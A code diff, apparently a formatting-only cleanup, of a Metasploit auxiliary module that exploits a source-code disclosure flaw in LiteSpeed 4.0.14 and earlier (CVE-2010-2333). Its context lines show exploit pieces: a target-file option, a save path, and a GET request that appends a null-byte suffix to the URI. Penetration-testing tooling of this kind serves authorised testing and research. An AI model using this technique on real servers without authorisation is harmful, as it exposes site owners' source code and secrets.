@@ -10,30 +10,29 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'LiteSpeed Source Code Disclosure/Download',
-      'Description'    => %q{
+      'Name' => 'LiteSpeed Source Code Disclosure/Download',
+      'Description' => %q{
           This module exploits a source code disclosure/download vulnerability in
         versions 4.0.14 and prior of LiteSpeed.
       },
-      'References'     =>
-        [
-          [ 'CVE', '2010-2333' ],
-          [ 'OSVDB', '65476' ],
-          [ 'BID', '40815' ],
-          [ 'EDB', '13850' ]
-        ],
-      'Author'         =>
-        [
-          'Kingcope',  # initial disclosure
-          'xanda'      # Metasploit module
-        ],
-      'License'        =>  MSF_LICENSE)
+      'References' => [
+        [ 'CVE', '2010-2333' ],
+        [ 'OSVDB', '65476' ],
+        [ 'BID', '40815' ],
+        [ 'EDB', '13850' ]
+      ],
+      'Author' => [
+        'Kingcope', # initial disclosure
+        'xanda' # Metasploit module
+      ],
+      'License' => MSF_LICENSE)
 
     register_options(
       [
         OptString.new('URI', [true, 'Specify the path to download the file (ex: admin.php)', '/admin.php']),
         OptString.new('PATH_SAVE', [true, 'The path to save the downloaded source code', '']),
-      ])
+      ]
+    )
   end
 
   def target_url
@@ -53,8 +52,8 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => "#{uri}#{nullbytetxt}",
+        'method' => 'GET',
+        'uri' => "#{uri}#{nullbytetxt}",
       }, 25)
 
       if res.nil?
@@ -88,7 +87,6 @@ class MetasploitModule < Msf::Auxiliary
         return
 
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
